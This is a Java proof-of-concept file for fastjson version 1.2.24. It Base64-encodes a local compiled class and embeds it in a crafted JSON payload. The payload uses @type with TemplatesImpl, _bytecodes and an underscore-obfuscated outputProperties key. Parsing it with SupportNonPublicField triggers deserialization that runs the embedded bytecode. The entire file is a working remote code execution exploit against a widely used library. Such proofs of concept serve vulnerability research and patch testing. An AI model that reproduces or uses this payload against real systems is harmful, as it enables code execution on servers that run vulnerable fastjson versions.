package com.firebasky.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class PoC_1_2_24 {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void main(String[] args) throws Exception {
        String s = readClass("d:/Test.class");
        String poc = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\""+s+"\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"ou_t_p_u_____________________tProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
